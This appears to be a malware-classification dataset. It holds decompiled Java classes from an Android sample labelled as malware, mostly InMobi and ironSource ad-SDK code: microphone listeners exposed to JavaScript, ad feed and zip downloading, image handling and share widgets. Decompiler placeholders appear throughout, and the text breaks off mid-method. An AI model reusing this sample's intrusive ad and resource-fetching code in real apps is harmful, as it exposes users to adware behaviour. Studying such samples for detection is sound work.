((Vibrator)this.imWebView.getActivity().getSystemService(""vibrator"")).vibrate(2000L);       new Timer().schedule(new g(),2000L);     }  else {       Log.internal(Constants.RENDERING_LOG_TAG,""vibrate called even if it is not supported"");     }   } class g extends TimerTask {     g(){     }     @Override public void run(){       try {         JSUtilityController.this.imWebView.raiseVibrateCompleteEvent();       }  catch (      Exception e) {         Log.internal(Constants.RENDERING_LOG_TAG,""Vibrate callback execption"",e);       }     }   }   @JavascriptInterface public void registerMicListener(){     if (!this.f) {       this.f=true;       AudioTriggerer.addEventListener(this.e);     }   }   @JavascriptInterface public void unRegisterMicListener(){     if (this.f) {       this.f=false;       AudioTriggerer.removeEventListener(this.e);     }   }   private void b(){     if (this.g) {       registerMicListener();     }   }   private void c(){     this.g=this.f;     unRegisterMicListener();   }   public void reset(){     if (this.c != null) {       this.c.reset();     }   }   @JavascriptInterface public void onUserInteraction(  String str){     try {       JSONObject jSONObject=new JSONObject(str);       HashMap<String,String> hashMap=new HashMap<>();       Iterator<String> keys=jSONObject.keys();       while (keys.hasNext()) {         String next=keys.next();         try {           hashMap.put(next,jSONObject.getString(next));         }  catch (        JSONException e2) {         }       }       this.imWebView.userInteraction(hashMap);     }  catch (    Exception e3) {     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\OrientationProperties.code","public static class OrientationProperties extends ReflectedParcelable {   public static final Parcelable.Creator<OrientationProperties> CREATOR=new g();   public boolean allowOrientationChange;   public String forceOrientation;   public OrientationProperties(){     initializeOrientationProperties();   }   public void initializeOrientationProperties(){     this.allowOrientationChange=false;     this.forceOrientation="""";   }   public OrientationProperties(  Parcel parcel){     super(parcel);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\PlayerProperties.code","public static class PlayerProperties extends ReflectedParcelable {   public static final Parcelable.Creator<PlayerProperties> CREATOR=new b();   public boolean audioMuted;   public boolean autoPlay;   public boolean doLoop;   public String id;   public boolean showControl;   public String startStyle;   public String stopStyle;   public PlayerProperties(){     this.showControl=true;     this.autoPlay=true;     this.audioMuted=false;     this.doLoop=false;     this.stopStyle=JSController.STYLE_NORMAL;     this.startStyle=JSController.STYLE_NORMAL;     this.id="""";   }   public PlayerProperties(  Parcel parcel){     super(parcel);   }   public void setStopStyle(  String str){     this.stopStyle=str;   }   public void setProperties(  boolean z,  boolean z2,  boolean z3,  boolean z4,  String str,  String str2,  String str3){     this.autoPlay=z2;     this.showControl=z3;     this.doLoop=z4;     this.audioMuted=z;     this.startStyle=str;     this.stopStyle=str2;     this.id=str3;   }   public boolean isAutoPlay(){     return this.autoPlay;   }   public boolean showControl(){     return this.showControl;   }   public boolean doLoop(){     return this.doLoop;   }   public boolean doMute(){     return this.audioMuted;   }   public boolean exitOnComplete(){     return this.stopStyle.equalsIgnoreCase(JSController.EXIT);   }   public boolean isFullScreen(){     return this.startStyle.equalsIgnoreCase(JSController.FULL_SCREEN);   }   public void setFullScreen(){     this.startStyle=JSController.FULL_SCREEN;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\Properties.code","public static class Properties extends ReflectedParcelable {   public static final Parcelable.Creator<Properties> CREATOR=new e();   public int backgroundColor;   public float backgroundOpacity;   public boolean useBackground;   public Properties(  Parcel parcel){     super(parcel);   }   public Properties(){     this.useBackground=false;     this.backgroundColor=0;     this.backgroundOpacity=0.0f;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\ReflectedParcelable.code","public static class ReflectedParcelable implements Parcelable {   public ReflectedParcelable(){   }   @Override public int describeContents(){     return 0;   }   protected ReflectedParcelable(  Parcel parcel){     for (    Field field : getClass().getDeclaredFields()) {       try {         Class<?> type=field.getType();         if (type.isEnum()) {           String cls=type.toString();           if (cls.equals(""class com.mraid.NavigationStringEnum"")) {             field.set(this,NavigationStringEnum.fromString(parcel.readString()));           }  else           if (cls.equals(""class com.mraid.TransitionStringEnum"")) {             field.set(this,TransitionStringEnum.fromString(parcel.readString()));           }         }  else         if (!(field.get(this) instanceof Parcelable.Creator)) {           field.set(this,parcel.readValue(null));         }       }  catch (      IllegalAccessException e) {         e.printStackTrace();         return;       } catch (      IllegalArgumentException e2) {         e2.printStackTrace();         return;       }     }   }   @Override public void writeToParcel(  Parcel parcel,  int i){     for (    Field field : getClass().getDeclaredFields()) {       try {         Class<?> type=field.getType();         if (type.isEnum()) {           String cls=type.toString();           if (cls.equals(""class com.mraid.NavigationStringEnum"")) {             parcel.writeString(((NavigationStringEnum)field.get(this)).getText());           }  else           if (cls.equals(""class com.mraid.TransitionStringEnum"")) {             parcel.writeString(((TransitionStringEnum)field.get(this)).getText());           }         }  else {           Object obj=field.get(this);           if (!(obj instanceof Parcelable.Creator)) {             parcel.writeValue(obj);           }         }       }  catch (      IllegalAccessException e) {         e.printStackTrace();         return;       } catch (      IllegalArgumentException e2) {         e2.printStackTrace();         return;       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\ResizeProperties.code","public static class ResizeProperties extends ReflectedParcelable {   public static final Parcelable.Creator<ResizeProperties> CREATOR=new a();   public boolean allowOffscreen;   public String customClosePosition;   public int height;   public int offsetX;   public int offsetY;   public int width;   public ResizeProperties(){     initializeResizeProperties();   }   public void initializeResizeProperties(){     this.offsetY=0;     this.offsetX=0;     this.height=0;     this.width=0;     this.allowOffscreen=false;     this.customClosePosition=""top-right"";   }   public ResizeProperties(  Parcel parcel){     super(parcel);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller.util\a.code","public class a implements View.OnTouchListener {   a(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller.util\AVPlayer.code","!org.eclipse.jdt.core.dom.TypeDeclaration@34dcbc3a"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller.util\AVPlayerListener.code","public interface AVPlayerListener {   void onComplete(  AVPlayer aVPlayer);   void onError(  AVPlayer aVPlayer);   void onPrepared(  AVPlayer aVPlayer); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller.util\b.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7a917801"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller.util\c.code","public class c implements View.OnTouchListener {   c(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     return motionEvent.getAction() == 2;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller.util\Constants.code","public final class Constants {   public static final String QA_MODE_IP=""117.97.87.6"";   public static final String RENDERING_LOG_TAG=""[InMobi]-[RE]-4.1.1""; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller.util\ImageProcessing.code","public class ImageProcessing {   public static String getBase64EncodedImage(  Bitmap bitmap,  Context context){     ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();     bitmap.compress(Bitmap.CompressFormat.JPEG,getDefaultImgQuality(context),byteArrayOutputStream);     return Base64.encodeToString(byteArrayOutputStream.toByteArray(),2);   }   public static String convertMediaUriToPath(  Uri uri,  Context context){     Cursor query=context.getContentResolver().query(uri,new String[]{""_data""},null,null,null);     int columnIndexOrThrow=query.getColumnIndexOrThrow(""_data"");     query.moveToFirst();     String string=query.getString(columnIndexOrThrow);     query.close();     return string;   }   public static int getDefaultImgWidth(  Context context){     return Initializer.getConfigParams().getPicWidth();   }   public static int getDefaultImgHeight(  Context context){     return Initializer.getConfigParams().getPicHeight();   }   public static int getDefaultImgQuality(  Context context){     return Initializer.getConfigParams().getPicQuality();   }   public static Bitmap getCompressedBitmap(  String str,  Context context){     Bitmap decodeStream;     try {       int defaultImgHeight=getDefaultImgHeight(context) * getDefaultImgWidth(context);       FileInputStream fileInputStream=new FileInputStream(str);       BitmapFactory.Options options=new BitmapFactory.Options();       options.inJustDecodeBounds=true;       BitmapFactory.decodeStream(fileInputStream,null,options);       fileInputStream.close();       int i=1;       while (options.outWidth * options.outHeight * (1.0d / Math.pow(i,2.0d)) > defaultImgHeight) {         i++;       }       FileInputStream fileInputStream2=new FileInputStream(str);       if (i > 1) {         BitmapFactory.Options options2=new BitmapFactory.Options();         options2.inSampleSize=i - 1;         Bitmap decodeStream2=BitmapFactory.decodeStream(fileInputStream2,null,options2);         int height=decodeStream2.getHeight();         int width=decodeStream2.getWidth();         double sqrt=Math.sqrt(defaultImgHeight / (width / height));         decodeStream=Bitmap.createScaledBitmap(decodeStream2,(int)((sqrt / height) * width),(int)sqrt,true);         decodeStream2.recycle();         System.gc();       }  else {         decodeStream=BitmapFactory.decodeStream(fileInputStream2);       }       fileInputStream2.close();       Log.debug(Constants.RENDERING_LOG_TAG,""bitmap size - width: "" + decodeStream.getWidth() + "", height: ""+ decodeStream.getHeight());       return decodeStream;     }  catch (    IOException e) {       Log.debug(Constants.RENDERING_LOG_TAG,e.getMessage(),e);       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller.util\StartActivityForResultCallback.code","public interface StartActivityForResultCallback {   void onActivityResult(  int i,  Intent intent); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\A.code","!org.eclipse.jdt.core.dom.TypeDeclaration@40c6658astatic class a extends View.BaseSavedState {   public static final Parcelable.Creator<a> b=new Parcelable.Creator<a>(){     @Override public final a createFromParcel(    Parcel parcel){       return new a(parcel);     }     @Override public final a[] newArray(    int i){       return new a[i];     }   } ;   boolean a;   public a(  Parcelable parcelable){     super(parcelable);   }   public a(  Parcel parcel){     super(parcel);     this.a=parcel.readInt() == 1;   }   @Override public final void writeToParcel(  Parcel parcel,  int i){     super.writeToParcel(parcel,i);     parcel.writeInt(this.a ? 1 : 0);   } } public interface a {   void a(  int i); } public static class a {   private String a;   private String b;   private String c;   private aF.a d;   private c e;   public a(  String str,  String str2,  String str3,  c cVar,  aF.a aVar){     this.a=str;     this.b=str2;     this.c=str3;     this.e=cVar;     this.d=aVar;   }   public final String a(){     return this.a;   }   public final String b(){     return this.c;   }   public final String c(){     return this.a + "".html"";   }   public final String d(){     return this.b;   }   public final aF.a e(){     return this.d;   }   public final c f(){     return this.e;   } } public static abstract class a implements c {   @Override public final void a(  String str){   }   @Override public final void a(  String str,  boolean z){   }   @Override public void a(  String str,  int i){   }   @Override public void a(  String str,  Exception exc){   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {   }   @Override public final void a(  JSONObject jSONObject,  String str,  boolean z){   } } public interface a { } public interface a {   void a(  int i); } public static class a implements aE.c {   private HashMap<String,Pair<String,JSONObject>> a=new HashMap<>();   private HashMap<String,String> b=new HashMap<>();   private String c=""pending"";   private aE.d d;   public a(  aE.d dVar){     this.d=null;     this.d=dVar;   }   public final void b(  String str) throws JSONException {     this.c=""started"";     Iterator<Map.Entry<String,Pair<String,JSONObject>>> it=this.a.entrySet().iterator();     if (!it.hasNext()) {       this.c=""finished"";       b();       return;     }     while (it.hasNext()) {       Pair<String,JSONObject> value=it.next().getValue();       if (""pending"".equals(value.first)) {         JSONObject jSONObject=(JSONObject)value.second;         String string=jSONObject.getString(""location"");         String string2=jSONObject.getString(""filename"");         String string3=jSONObject.getString(AnalyticsSQLiteHelper.EVENT_LIST_TYPE);         aO.a(""feed"".equals(string3) ? string + ""?"" + this.d.a() : string,""zip"".equals(string3) ? new C0108q.d(str,string2,this) : ""feed"".equals(string3) ? new C0108q.a(str,string2,this) : new C0108q.c(str,string2,this));       }     }   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     if (!this.c.equals(""all-complete-called"")) {       String string=jSONObject.getString(AnalyticsEvent.EVENT_ID);       String string2=jSONObject.getString(""filename"");       this.a.put(string,new Pair<>(""pending"",jSONObject));       this.b.put(string2,string);     }   }   @Override public final void a(  String str){     String str2=this.b.get(str);     this.a.put(str2,new Pair<>(""pending"",(JSONObject)this.a.get(str2).second));   }   private boolean c(  String str){     return ((JSONObject)this.a.get(this.b.get(str)).second).optBoolean(""mandatory"",true);   }   private synchronized void a(){     boolean z;     if (!this.c.equals(""all-complete-called"")) {       Iterator<Map.Entry<String,Pair<String,JSONObject>>> it=this.a.entrySet().iterator();       while (true) {         if (!it.hasNext()) {           z=true;           break;         }         String str=(String)it.next().getValue().first;         if (!""finished"".equals(str) && !""failed"".equals(str) && !""failed-ignored"".equals(str)) {           z=false;           break;         }       }       if (z) {         if (!this.c.equals(""failed"")) {           this.c=""finished"";           try {             Iterator<Map.Entry<String,Pair<String,JSONObject>>> it2=this.a.entrySet().iterator();             while (it2.hasNext()) {               Pair<String,JSONObject> value=it2.next().getValue();               if (((String)value.first) == ""finished"") {                 JSONObject jSONObject=(JSONObject)value.second;                 String string=jSONObject.getString(AnalyticsEvent.EVENT_ID);                 String optString=jSONObject.optString(""version"");                 if (optString != null) {                   aO.b(string,optString);                 }               }             }           }  catch (          JSONException e) {             aE.a(MobileCore.c(),getClass().getName(),e);             this.c=""failed"";           }         }         b();       }     }   }   private synchronized void b(){     if (!this.c.equals(""all-complete-called"")) {       this.d.a(""finished"".equals(this.c));       this.c=""all-complete-called"";     }   }   @Override public final void a(  String str,  Exception exc){     if (!this.c.equals(""all-complete-called"")) {       A.a(""ResourceManager | processException "" + str,2);       String str2=this.b.get(str);       JSONObject jSONObject=(JSONObject)this.a.get(str2).second;       String str3=""failed"";       if (!c(str)) {         str3=""failed-ignored"";       }  else {         this.c=""failed"";         b();       }       this.a.put(str2,new Pair<>(str3,jSONObject));       aE.d dVar=this.d;       a();     }   }   @Override public final void a(  String str,  int i){     if (!this.c.equals(""all-complete-called"")) {       String str2=this.b.get(str);       boolean c=c(str);       JSONObject jSONObject=(JSONObject)this.a.get(str2).second;       String str3=""failed"";       if (!c && i >= 400 && i < 500) {         str3=""failed-ignored"";       }  else {         this.c=""failed"";         b();       }       this.a.put(str2,new Pair<>(str3,jSONObject));       aE.d dVar=this.d;       a();     }   }   @Override public final void a(  String str,  boolean z){     if (!this.c.equals(""all-complete-called"")) {       A.a(""ResourceManager | processComplete "" + str + "" - ""+ (z ? ""OK"" : ""NEY""),55);       String str2=this.b.get(str);       this.a.put(str2,new Pair<>(z ? ""finished"" : ""failed"",(JSONObject)this.a.get(str2).second));       if (!z) {         this.c=""failed"";         b();       }       aE.d dVar=this.d;       a();     }   }   @Override public final void a(  JSONObject jSONObject,  String str,  boolean z){     a(str,z);     if (z) {       aE.d dVar=this.d;     }   } } public interface a {   void i();   void j(); } public abstract class a {   protected String a;   public abstract void a();   public a(  String str){     this.a=str;   } } public interface a {   void a(); } public interface a {   void a(  String str); } public static class a {   private b a;   private Drawable b;   private Drawable c;   private JSONObject d;   public a(  b bVar,  Drawable drawable,  Drawable drawable2,  JSONObject jSONObject){     this.a=bVar;     this.b=drawable;     this.c=drawable2;     this.d=jSONObject;   }   public final b a(){     return this.a;   }   public final Drawable b(){     return this.b;   }   public final Drawable c(){     return this.c;   }   public final JSONObject d(){     return this.d;   } } public interface a {   void a();   void a(  Bitmap bitmap); } public static final class a extends Drawable.ConstantState {   int a;   int b;   int c;   a(  a aVar){     if (aVar != null) {       this.a=aVar.a;       this.b=aVar.b;     }   }   @Override public final Drawable newDrawable(){     return new C0072ad(this,(byte)0);   }   @Override public final Drawable newDrawable(  Resources resources){     return new C0072ad(this,(byte)0);   }   @Override public final int getChangingConfigurations(){     return this.c;   } } private static class a {   private String a;   private String b;   public a(  JSONObject jSONObject){     if (jSONObject != null) {       this.a=jSONObject.optString(AnalyticsSQLiteHelper.EVENT_LIST_TYPE,"""");       this.b=jSONObject.optString(""value"","""");     }   }   public final Drawable a(  Context context){     if (TextUtils.isEmpty(this.b)) {       return null;     }     if (this.a.equals(AdView.BANNER_TYPE_IMAGE)) {       return new BitmapDrawable(context.getResources(),B.a(context,this.b));     }     if (this.a.equals(""tile"")) {       String str=this.b;       if (TextUtils.isEmpty(str)) {         return null;       }       BitmapDrawable bitmapDrawable=new BitmapDrawable(context.getResources(),B.a(context,str));       bitmapDrawable.setTileModeX(Shader.TileMode.REPEAT);       bitmapDrawable.setTileModeY(Shader.TileMode.REPEAT);       return bitmapDrawable;     }     if (this.a.equals(""9patch"")) {       Bitmap a=B.a(this.b);       byte[] ninePatchChunk=a.getNinePatchChunk();       if (!NinePatch.isNinePatchChunk(ninePatchChunk)) {         return null;       }       B.b a2=B.b.a(ninePatchChunk);       System.gc();       if (ninePatchChunk != null) {         return new NinePatchDrawable(a,ninePatchChunk,a2.a,null);       }       return null;     }     if (this.a.equals(""color"")) {       return new ColorDrawable(Color.parseColor(this.b));     }     return null;   } } public interface a {   void a();   void a(  String str,  boolean z); } public static final class a {   private final String a;   private final boolean b;   a(  String str,  boolean z){     this.a=str;     this.b=z;   }   public final String a(){     return this.a;   }   public final boolean b(){     return this.b;   } } public static abstract class a {   public byte[] a;   public int b;   a(){   } } public static class a extends c {   private static boolean d=false;   private long e;   public a(  String str,  String str2,  aE.c cVar){     super(str,str2,cVar);   }   private String a(  String str){     if (TextUtils.isEmpty(str)) {       return null;     }     String str2=aE.b(str) + aE.h(str);     String str3=aO.a() + ""/"" + str2;     File file=new File(str3);     if (!file.exists()) {       aO.a(str,this.c);     }  else {       file.setLastModified(System.currentTimeMillis());       A.a(""ResourceManager |  resource: "" + str2 + "" is already here - updated timestamp"",55);     }     return ""file://"" + str3;   }   private void a(){     long currentTimeMillis=System.currentTimeMillis();     File file=new File(aO.a());     if (file.exists()) {       File[] listFiles=file.listFiles();       for (      File file2 : listFiles) {         if (currentTimeMillis - file2.lastModified() > this.e) {           file2.delete();         }       }     }   }   private boolean a(  JSONObject jSONObject){     JSONObject jSONObject2;     try {       a(jSONObject,jSONObject.optJSONArray(""extra""));       JSONObject optJSONObject=jSONObject.optJSONObject(""expirations"");       if (optJSONObject == null) {         JSONObject jSONObject3=new JSONObject();         jSONObject.putOpt(""expirations"",jSONObject3);         jSONObject2=jSONObject3;       }  else {         jSONObject2=optJSONObject;       }       long currentTimeMillis=System.currentTimeMillis();       long optLong=jSONObject2.optLong(""soft_expiration"",-1L);       long optLong2=jSONObject2.optLong(""hard_expiration"",-1L);       A.a(""FeedExpiration | processed feed. expirationTimeSoft:"" + optLong + "" , expirationTimeHard:""+ optLong2,55);       if (optLong <= 0) {         optLong=-1;       }       long j=optLong2 <= 0 ? -1L : optLong2;       long j2=optLong != -1 ? optLong + currentTimeMillis : -1L;       long j3=j != -1 ? j + currentTimeMillis : -1L;       jSONObject2.putOpt(""soft_expiration"",Long.valueOf(j2));       jSONObject2.putOpt(""hard_expiration"",Long.valueOf(j3));       this.e=jSONObject2.optLong(""media_expiration"",86400000L);       if (!d) {         a();         d=true;       }       JSONArray optJSONArray=jSONObject.optJSONArray(NativeAdResponse.KEY_ADS);       JSONArray jSONArray=new JSONArray();       for (int i=0; i < optJSONArray.length(); i++) {         JSONObject optJSONObject2=optJSONArray.optJSONObject(i);         jSONArray.put(optJSONObject2);         optJSONObject2.putOpt(""img"",a(optJSONObject2.optString(""img"")));         optJSONObject2.putOpt(""cover_img"",a(optJSONObject2.optString(""cover_img"")));         a(optJSONObject2,optJSONObject2.optJSONArray(""extra""));       }       jSONObject.put(NativeAdResponse.KEY_ADS,jSONArray);       return true;     }  catch (    Exception e) {       if (this.c != null) {         this.c.a(this.a,e);       }       return false;     }   }   private void a(  JSONObject jSONObject,  JSONArray jSONArray){     if (jSONArray != null) {       try {         JSONArray jSONArray2=new JSONArray();         for (int i=0; i < jSONArray.length(); i++) {           JSONObject optJSONObject=jSONArray.optJSONObject(i);           String string=optJSONObject.getString(""value"");           String string2=optJSONObject.getString(MetaDataStyle.KEY_NAME);           String string3=optJSONObject.getString(AnalyticsSQLiteHelper.EVENT_LIST_TYPE);           if (""img"".equalsIgnoreCase(string3) || ""audio"".equalsIgnoreCase(string3) || ""video"".equalsIgnoreCase(string3)|| ""file"".equalsIgnoreCase(string3)) {             jSONObject.putOpt(string2,a(string));           }  else           if (""report"".equalsIgnoreCase(string3)) {             jSONArray2.put(optJSONObject);           }  else {             jSONObject.putOpt(string2,string);           }         }         jSONObject.remove(""extra"");         jSONObject.put(""extra"",jSONArray2);       }  catch (      JSONException e) {         if (this.c != null) {           this.c.a(this.a,e);         }       }     }   }   @Override public final boolean a(  HttpResponse httpResponse){     boolean z;     try {       InputStream content=httpResponse.getEntity().getContent();       Header firstHeader=httpResponse.getFirstHeader(""Content-Encoding"");       BufferedReader bufferedReader=new BufferedReader(new InputStreamReader((firstHeader == null || !firstHeader.getValue().equalsIgnoreCase(""gzip"")) ? content : new GZIPInputStream(content),""UTF-8""));       StringBuilder sb=new StringBuilder();       while (true) {         String readLine=bufferedReader.readLine();         if (readLine == null) {           break;         }         sb.append(readLine).append(""\n"");       }       JSONObject jSONObject=new JSONObject(new JSONTokener(sb.toString()));       if (jSONObject.optString(AnalyticsEvent.EVENT_ID,null) == null) {         aE.b(MobileCore.c(),MobileCore.class.getName(),""Feed is missing field 'id'"");       }       JSONArray optJSONArray=jSONObject.optJSONArray(NativeAdResponse.KEY_ADS);       if (optJSONArray == null || optJSONArray.length() <= 0) {         Context c=MobileCore.c();         String name=MobileCore.class.getName();         Object[] objArr=new Object[1];         objArr[0]=optJSONArray == null ? ""missing"" : ""empty"";         aE.b(c,name,String.format(""Feed ads are invalid (%s)"",objArr));         z=false;       }  else {         z=true;       }       boolean z2=z && a(jSONObject);       if (this.c == null) {         return true;       }       this.c.a(jSONObject,this.a,z2);       return true;     }  catch (    Exception e) {       if (this.c != null) {         this.c.a(this.a,e);       }       return false;     }   } } public interface a {   void a(  JSONObject jSONObject); } interface a {   void a(  JSONObject jSONObject); } public static class a {   private String a;   private Object b;   public a(  String str,  String str2){     this.a=str;     this.b=str2;   }   public a(  String str,  JSONObject jSONObject){     this.a=str;     this.b=jSONObject;   } } !org.eclipse.jdt.core.dom.TypeDeclaration@727b8398public interface a { } public class a {   private int b;   private Intent c;   public a(  int i,  Intent intent){     this.b=i;     this.c=intent;   }   public final void a(){     if (this.c != null) {       A.a(""MobileCoreReport service , ServiceTask , doJob() | mStartId:"" + this.b,55);       new aJ().a(MobileCoreReport.this,this.c);     }   } } public interface a {   boolean a(); } class a extends Handler {   a(){   }   @Override public final void handleMessage(  Message message){     super.handleMessage(message);     if (!hasMessages(1) && V.this.a != null) {       b unused=V.this.a;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aA.code","final class aA extends F {   private String a;   public aA(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""ironsourceSocialWidgetTwitter"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     this.a=jSONObject.optString(""tweetText"","""");     super.a(jSONObject);   }   @Override public final void a(  View view){     try {       aE.a(this.e,MessageFormat.format(""https://twitter.com/intent/tweet?text={0}&url={1}"",aE.e(this.a),aE.e(aE.j(this.c))),true);     }  catch (    UnsupportedEncodingException e) {       e.printStackTrace();     }     super.a(view);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\aB.code","public final class aB extends H {   private ArrayList<F> a;   public aB(  Context context,  C0091aw c0091aw){     super(context,c0091aw);     this.a=new ArrayList<>();   }   @Override public final String a(){     return ""ironsourceSocialWidget"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     super.a(jSONObject,false);     JSONObject optJSONObject=jSONObject.optJSONObject(""facebookPostToWallItem"");     if (optJSONObject != null) {       a(new C0092ax(this.c,this.d),optJSONObject);     }     JSONObject optJSONObject2=jSONObject.optJSONObject(""twitterTweetItem"");     if (optJSONObject2 != null) {       a(new aA(this.c,this.d),optJSONObject2);     }     JSONObject optJSONObject3=jSONObject.optJSONObject(""googlePlusPostItem"");     if (optJSONObject3 != null) {       a(new az(this.c,this.d),optJSONObject3);     }     JSONObject optJSONObject4=jSONObject.optJSONObject(""shareItem"");     if (optJSONObject4 != null) {       a(new ay(this.c,this.d),optJSONObject4);     }     d();   }   @Override public final void a(  int i){     super.a(i);     Iterator<F> it=this.a.iterator();     while (it.hasNext()) {       it.next().a(i);     }   }   @Override public final void a(  Activity activity){     super.a(activity);     Iterator<F> it=this.a.iterator();     while (it.hasNext()) {       it.next().a(activity);     }   }   @Override protected final boolean f(){     return true;   }   @Override protected final void c(){     this.h=new LinearLayout(this.c);     this.h.setLayoutParams(new RelativeLayout.LayoutParams(-1,-2));     ((LinearLayout)this.h).setOrientation(0);   }   @Override public final void d(){     ViewGroup viewGroup=(ViewGroup)this.h;     Iterator<F> it=this.a.iterator();     while (it.hasNext()) {       F next=it.next();       LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-1);       layoutParams.weight=1.0f;       viewGroup.addView(next.i(),layoutParams);     }   }   @Override public final void e(){   }   private void a(  F f,  JSONObject jSONObject) throws JSONException {     f.a(jSONObject);     f.k=this.k;     this.a.add(f);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\AbstractC0073ae.code","public abstract class AbstractC0073ae extends AbstractC0077ai {   private final Runnable K;   private Runnable L;   private C0083ao M;   private boolean N;   protected int b;   protected final Runnable c;   protected float d;   protected boolean e;   protected float f;   protected float g;   protected float h;   protected float i;   protected long j;   protected C0083ao k;   protected VelocityTracker l;   protected int m;   protected boolean n;   protected int o;   protected static final Interpolator a=new AccelerateInterpolator();   private static final Interpolator I=new InterpolatorC0079ak();   private static final Interpolator J=new InterpolatorC0085aq();   protected abstract void a();   protected abstract void a(  Canvas canvas,  int i);   public abstract boolean a(  float f);   public abstract boolean a(  MotionEvent motionEvent);   public abstract void b(  float f);   protected abstract void b(  int i);   protected abstract void b(  Canvas canvas,  int i);   public abstract void b(  MotionEvent motionEvent);   public abstract boolean b();   protected abstract void c(  Canvas canvas,  int i);   public AbstractC0073ae(  Activity activity,  int i){     super(activity,i);     this.c=new Runnable(){       @Override public final void run(){         AbstractC0073ae.this.m();       }     } ;     this.K=new Runnable(){       @Override public final void run(){         AbstractC0073ae.this.l();       }     } ;     this.h=-1.0f;     this.i=-1.0f;     this.n=true;   }   @Override public final void a(  Context context,  AttributeSet attributeSet){     super.a(context,attributeSet);     ViewConfiguration viewConfiguration=ViewConfiguration.get(context);     this.b=viewConfiguration.getScaledTouchSlop();     this.m=viewConfiguration.getScaledMaximumFlingVelocity();     this.M=new C0083ao(context,J);     this.k=new C0083ao(context,I);     this.o=d(3);   }   @Override public final void c(  boolean z){     if (this.D == 8 || this.D == 4) {       b(z);     }  else     if (this.D == 0 || this.D == 1) {       a(z);     }   }   @Override public final boolean c(){     return this.C;   }   @Override public final void c(  int i){     this.A=i;     this.B=true;     if (this.D == 8 || this.D == 4) {       c(this.A);     }     requestLayout();     invalidate();   }   @Override public final void d(){     if (5000 < 0) {       throw new IllegalArgumentException(""startDelay must be zero or larger."");     }     if (10000 < 0) {       throw new IllegalArgumentException(""delay must be zero or larger"");     }     removeCallbacks(this.c);     removeCallbacks(this.L);     this.M.a(0,0,this.A / 3,0,500);     e();     l();     this.j=0L;     this.L=new Runnable(){       @Override public final void run(){         AbstractC0073ae.this.h();       }     } ;     postDelayed(this.L,500L);   }   public final void c(  float f){     int i=(int)this.d;     int i2=(int)f;     this.d=f;     if (i2 != i) {       b(i2);       this.C=i2 != 0;     }   }   public final void e(){     if (p && this.H && !this.N) {       this.N=true;     }   }   private void k(){     if (this.N) {       this.N=false;       this.z.setLayerType(0,null);       this.y.setLayerType(0,null);     }   }   public final void f(){     if (this.G == 1) {       this.F=this.E;     }  else     if (this.G == 2) {       this.F=getMeasuredWidth();     }  else {       this.F=0;     }   }   public final void g(){     removeCallbacks(this.K);     this.M.e();     k();   }   public final void a(  int i,  int i2,  boolean z){     int abs;     this.e=false;     if (this.l != null) {       this.l.recycle();       this.l=null;     }     i();     int i3=(int)this.d;     int i4=i - i3;     if (i4 == 0 || !z) {       c(i);       e(i != 0 ? 8 : 0);       k();       return;     }     int abs2=Math.abs(i2);     if (abs2 > 0) {       abs=Math.round(Math.abs(i4 / abs2) * 1000.0f) * 4;     }  else {       abs=(int)(600.0f * Math.abs(i4 / this.A));     }     int min=Math.min(abs,Values.MAX_AUTO_RELOAD);     if (i4 > 0) {       e(4);       this.M.a(i3,0,i4,0,min);     }  else {       e(1);       this.M.a(i3,0,i4,0,min);     }     e();     l();   }   public void l(){     if (this.M.d()) {       int i=(int)this.d;       int b=this.M.b();       if (b != i) {         c(b);       }       if (b != this.M.c()) {         postOnAnimation(this.K);         return;       }     }     this.M.e();     int c=this.M.c();     c(c);     